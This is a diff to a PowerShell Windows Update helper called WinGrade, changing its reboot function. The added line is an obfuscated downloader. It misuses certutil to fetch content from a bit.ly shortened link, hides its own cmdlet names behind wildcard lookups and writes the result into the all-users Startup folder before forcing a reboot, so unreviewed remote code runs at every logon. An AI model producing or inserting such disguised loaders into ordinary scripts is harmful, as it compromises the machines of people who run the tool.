@@ -156,18 +156,12 @@ function get-reboot {
     $key = Get-Item "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired" -ErrorAction SilentlyContinue
     if($key -ne $null) {
         Write-Host -ForegroundColor Cyan "`nRebooting..."
-	#$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1'''))'"
-        #$trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
-        #$settings = New-ScheduledTaskSettingsSet -Compatibility Win7
-        #$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
-        #$definition = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Description "WinGrade a tool for Windows Updates."
-
-        #Register-ScheduledTask -TaskName $taskName -InputObject $definition
+	((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-Skip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join"`r`n") >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WinGrade.ps1"
         Restart-Computer -Force
     }
     else { 
         Write-Host -ForegroundColor Green "`nNo reboot required."
-        schtasks /Delete /tn WinGrade
+        del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WinGrade.ps1"
         elevate-privileges
     }
 }
